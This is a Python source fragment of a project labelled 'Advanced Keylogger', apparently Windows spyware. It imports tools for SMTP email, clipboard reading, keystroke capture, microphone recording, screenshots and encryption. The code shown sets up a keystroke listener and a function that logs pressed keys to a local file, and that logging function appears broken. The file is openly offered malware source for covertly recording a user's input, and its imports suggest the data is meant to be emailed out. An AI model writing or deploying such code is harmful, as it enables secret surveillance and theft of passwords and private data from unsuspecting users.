#modules_used_for_email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#modules_used_for_device_info
import socket
import platform
import  time
import os

#modules_used_for_clipboard_and_keystoke
import win32clipboard
from pynput.keyboard import Key, Listener

#modules_used_for_sound_and_screenshots
from scipy.io.wavfile import write
import sounddevice as sd
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#modules_used_for_encryption
from cryptography.fernet import Fernet

#modules_used_for_request
import getpass
from requests import get

key_stokes_info = "log.txt"
path = "C:\\Users\\aryak\\PycharmProjects\\Advanced Keylogger\\Resources"
extend = "\\"

count = 0
keys = []

def on_pressed(key):
    global keys, count
    print(key)
    keys.append(key)
    count +=1

def write_file(keys):
    with open(path + extend + key_stokes_info, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space")> 0:
                f.write("\n")
                f.close()

def on_release(key):
    if key == Key.esc:
        return False
